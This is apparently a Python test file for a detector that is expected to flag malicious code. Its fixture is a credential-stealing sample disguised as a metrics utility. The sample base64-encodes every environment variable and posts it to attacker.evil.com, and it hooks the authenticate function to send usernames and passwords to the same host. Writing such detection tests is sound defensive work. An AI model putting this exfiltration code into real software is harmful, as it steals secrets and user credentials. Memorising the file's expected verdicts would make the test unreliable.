"""Test case 005: Data exfiltration pattern detection."""


def test_005_credential_exfiltration():
    """
    ATTACK: Steal credentials from environment and send to attacker
    TOOLS: LLM intent detection
    EXPECTED: CRITICAL, is_malicious=True
    DECISION: FAIL
    """
    exfiltration_code = '''
# Appears to be a utility module
import os
import requests
import base64

def sync_metrics():
    """Sync application metrics to monitoring service."""
    env_data = os.environ.copy()
    payload = base64.b64encode(str(env_data).encode()).decode()

    try:
        requests.post(
            "http://attacker.evil.com:9999/collect",
            json={"data": payload},
            timeout=2
        )
    except:
        pass

sync_metrics()

original_login = authenticate

def authenticate(username, password):
    """Modified authentication to exfiltrate credentials."""
    requests.post(
        "http://attacker.evil.com:9999/creds",
        json={"user": username, "pass": password},
        timeout=1
    )
    return original_login(username, password)
    '''

    expected_llm_analysis = {
        "risk_score": 9.8,
        "risk_level": "CRITICAL",
        "is_malicious": True,
        "detected_patterns": [
            "Environment variable harvesting (credential theft)",
            "Base64 encoding of sensitive data (obfuscation)",
            "HTTP POST to external attacker domain",
            "Function hooking to intercept credentials",
            "Silent error handling to hide intrusion",
            "Multiple exfiltration vectors (env + authentication)",
        ],
        "recommendations": [
            "BLOCK - Confirmed credential theft attack",
            "Immediate security incident response",
            "Rotate all environment secrets",
            "Audit git history for similar commits",
            "Notify affected users",
            "Investigate attacker domain for other victims",
        ],
        "reasoning": "Multi-stage data exfiltration attack: harvests environment, exfiltrates to attacker-controlled server, and intercepts authentication credentials.",
    }

    expected_decision = "FAIL"

    assert "os.environ.copy()" in exfiltration_code
    assert "base64.b64encode" in exfiltration_code
    assert "http://attacker.evil.com:9999/collect" in exfiltration_code
    assert "http://attacker.evil.com:9999/creds" in exfiltration_code

    assert expected_llm_analysis["risk_score"] == 9.8
    assert expected_llm_analysis["risk_level"] == "CRITICAL"
    assert expected_llm_analysis["is_malicious"] is True
    assert len(expected_llm_analysis["detected_patterns"]) >= 3
    assert len(expected_llm_analysis["recommendations"]) >= 3
    assert expected_decision == "FAIL"

    return exfiltration_code, expected_llm_analysis